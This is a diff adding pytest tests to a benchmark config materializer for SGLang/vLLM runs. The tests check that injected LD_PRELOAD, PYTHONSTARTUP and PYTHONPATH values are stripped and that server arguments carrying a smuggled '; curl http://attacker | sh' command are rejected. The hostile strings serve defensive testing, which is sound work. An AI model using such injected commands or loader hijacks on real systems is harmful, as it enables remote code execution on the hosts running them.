@@ -54,6 +54,13 @@ def _materialize(src, out, **kw):
     return yaml.safe_load(res.read_text())["benchmark"]
 
 
+def _stub_server_arg_injectors(monkeypatch):
+    monkeypatch.setattr(we, "inject_sglang_context_length", lambda args, *a, **k: args)
+    monkeypatch.setattr(we, "inject_sglang_watchdog_timeout", lambda args, *a, **k: args)
+    monkeypatch.setattr(we, "inject_sglang_attention_backend", lambda args, *a, **k: args)
+    monkeypatch.setattr(we, "inject_sglang_moe_runner_backend", lambda args, *a, **k: args)
+
+
 def test_materialize_remove_args_and_string_unset_env(tmp_path, monkeypatch):
     _clear_env(monkeypatch)
     src = tmp_path / "base.yaml"
@@ -77,6 +84,45 @@ def test_materialize_remove_args_and_string_unset_env(tmp_path, monkeypatch):
     assert "--keep-base 2" in envs["EXTRA_SGLANG_ARGS"]
     assert "--variant 4" in envs["EXTRA_SGLANG_ARGS"]
     assert envs["SGLANG_REMOVE_ME"] == "override"
+
+
+def test_materialize_drops_loader_env_injections(tmp_path, monkeypatch):
+    _clear_env(monkeypatch)
+    _stub_server_arg_injectors(monkeypatch)
+    src = tmp_path / "base.yaml"
+    _write(src)
+    bench = _materialize(
+        src,
+        tmp_path / "out",
+        extra_envs={
+            "LD_PRELOAD": "/tmp/evil.so",
+            "PYTHONSTARTUP": "/tmp/pwn.py",
+            "SGLANG_USE_AITER": "1",
+        },
+        reference_envs={
+            "PYTHONPATH": "/tmp/evil",
+            "VLLM_ROCM_USE_AITER": "1",
+        },
+    )
+    envs = bench["envs"]
+    assert "LD_PRELOAD" not in envs
+    assert "PYTHONSTARTUP" not in envs
+    assert "PYTHONPATH" not in envs
+    assert envs["SGLANG_USE_AITER"] == "1"
+    assert envs["VLLM_ROCM_USE_AITER"] == "1"
+
+
+def test_materialize_rejects_shell_control_in_server_args(tmp_path, monkeypatch):
+    _clear_env(monkeypatch)
+    _stub_server_arg_injectors(monkeypatch)
+    src = tmp_path / "base.yaml"
+    _write(src)
+    with pytest.raises(ValueError, match="shell control"):
+        _materialize(
+            src,
+            tmp_path / "out",
+            extra_server_args="--dtype bfloat16; curl http://attacker | sh",
+        )
 
 
 # ---- _visible_gpu_count ---------------------------------------------------
